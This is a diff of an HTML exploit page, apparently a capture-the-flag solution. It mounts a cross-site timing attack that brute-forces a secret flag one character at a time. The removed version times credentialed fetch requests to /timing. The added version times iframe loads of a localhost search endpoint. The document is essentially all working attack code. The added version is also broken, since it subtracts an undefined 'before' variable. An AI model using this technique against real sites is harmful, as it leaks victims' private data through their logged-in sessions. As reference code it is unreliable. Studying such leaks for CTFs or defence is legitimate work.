@@ -1,36 +1,22 @@
 <!DOCTYPE html>
 <body>
   <pre id="result" style="white-space: pre-wrap;"></pre>
+    <script>
+      const flag = "{{ flag }}";
+      const chr_list = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','}'];
+      
+      for(let chr=0; chr<chr_list.length; chr++){
+        let start = performance.now();
+        const iframe = document.createElement("iframe");
+        iframe.src = `http://127.0.0.1:8000/timing?query=${flag + chr_list[chr]}`;
 
-  <script>
-    const fl = "{{ flag }}";
-    const charset = [
-      'a','b','c','d','e','f','g','h','i','j','k','l','m',
-      'n','o','p','q','r','s','t','u','v','w','x','y','z','}'
-    ];
+        iframe.onload = () => {
+          const after = performance.now();
+          console.log(flag+chr_list[chr]+'===>'+(after-before));
+        };
 
-    const result = document.getElementById("result");
-
-    charset.forEach((chr) => {
-      const start = performance.now();
-
-      fetch('/timing', {
-        method: "POST",
-        mode: 'no-cors',
-        credentials: 'include',
-        // body는 문자열이나 FormData여야 함
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-        },
-        body: "keyword=" + fl + encodeURIComponent(chr),
-      }).then(() => {
-        const time = performance.now() - start;
-
-        // 브라우저 화면에 찍기
-        result.innerText += `문자 ${chr} 요청 시간: ${time.toFixed(2)} ms\n`;
-      }).catch((err) => {
-        result.innerText += `문자 ${chr} 요청 실패: ${err}\n`;
-      });
-    });
-  </script>
+        document.body.appendChild(iframe);
+      }
+    </script>
 </body>
+
